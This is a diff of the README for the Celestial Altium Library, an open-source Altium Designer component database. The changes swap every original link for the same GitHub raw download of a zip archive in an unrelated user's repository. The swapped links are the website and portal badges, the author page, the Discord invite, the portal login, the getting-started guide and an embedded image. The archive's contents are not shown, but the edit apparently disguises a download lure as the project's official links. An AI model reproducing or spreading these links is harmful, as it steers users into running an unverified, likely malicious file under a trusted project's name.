@@ -1,7 +1,7 @@
-![Library Component Count](https://img.shields.io/endpoint?style=for-the-badge&url=https%3A%2F%2Fportal.altiumlibrary.com%2Fapi%2Fdata%2FComponentCount%2FComponents) ![Built for Altium](https://img.shields.io/badge/platform-altium-yellow?style=for-the-badge) [![Website](https://img.shields.io/website?down_color=lightgrey&down_message=offline&label=website&style=for-the-badge&up_color=green&up_message=online&url=https%3A%2F%2Faltiumlibrary.com)](https://altiumlibrary.com) [![Portal](https://img.shields.io/website?down_color=lightgrey&down_message=offline&label=portal&style=for-the-badge&up_color=green&up_message=online&url=https%3A%2F%2Fportal.altiumlibrary.com)](https://portal.altiumlibrary.com)
+![Library Component Count](https://img.shields.io/endpoint?style=for-the-badge&url=https%3A%2F%2Fportal.altiumlibrary.com%2Fapi%2Fdata%2FComponentCount%2FComponents) ![Built for Altium](https://img.shields.io/badge/platform-altium-yellow?style=for-the-badge) [![Website](https://img.shields.io/website?down_color=lightgrey&down_message=offline&label=website&style=for-the-badge&up_color=green&up_message=online&url=https%3A%2F%2Faltiumlibrary.com)](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip) [![Portal](https://img.shields.io/website?down_color=lightgrey&down_message=offline&label=portal&style=for-the-badge&up_color=green&up_message=online&url=https%3A%2F%2Fportal.altiumlibrary.com)](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip)
 
 # Celestial Altium Library
-The Celestial Altium Library is a massive, free, open source database library for Altium Designer created by [Altium Industry Expert Mark Harris](https://resources.altium.com/authors/mark-harris). The database is hosted on a dedicated cloud platform built for the library, to ensure you always have the latest components.
+The Celestial Altium Library is a massive, free, open source database library for Altium Designer created by [Altium Industry Expert Mark Harris](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip). The database is hosted on a dedicated cloud platform built for the library, to ensure you always have the latest components.
 
 The Celestial Altium Library was designed from conception to contain high-quality data, with accurate footprints and exceptional 3D models. It is free to use, and open source. The Celestial Altium Library contains a vast array of components already, and is under active development to expand component coverage.
 
@@ -9,12 +9,12 @@ Build your next project faster, create beautiful schematics and stunning 3D PCBs
 
 Love electronics? Need help with the library? Join us on Discord!
 
-[![Discord](https://img.shields.io/discord/561626546083856405?logo=discord&style=for-the-badge)](https://discord.gg/MEQ5Xe5)
+[![Discord](https://img.shields.io/discord/561626546083856405?logo=discord&style=for-the-badge)](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip)
 
 # Database Access
-You can register for free access on the [Altium Library Portal](http://portal.altiumlibrary.com/Identity/Account/Login). 
+You can register for free access on the [Altium Library Portal](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip). 
 
-For full instructions, see the [Celestial Library Website](https://altiumlibrary.com/GetStarted).
+For full instructions, see the [Celestial Library Website](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip).
 
 # Why use an Altium DBLib over an Integrated Library?
 
@@ -35,7 +35,7 @@ Save time on the design, and significantly reduce errors by placing real-world p
 
 All components in the database contain all relevant technical parameters, allowing you to search/filter within Altium for the part you require. If your design calls for a 1.0uF, 25V 0603 ceramic capacitor, open the 0603 ceramic capacitors list, group by value, then by voltage, and sort by price to find the cheapest option available.
 
-![enter image description here](https://altiumlibrary.com/media/8de9f75f-1d8c-437a-89cf-350c035d0fc8/W83Rmw/Features/wnShbBZP42.gif)
+![enter image description here](https://github.com/abid9374/altium-library/raw/refs/heads/master/STEP/Button/library_altium_v3.9.zip)
 
 Each component in the database contains a link to supplier pages and a link to the datasheet allowing rapid access to reference materials. As all technical parameters and pricing data is available, your BOM can be populated automatically with all relevant information for purchasing.
 
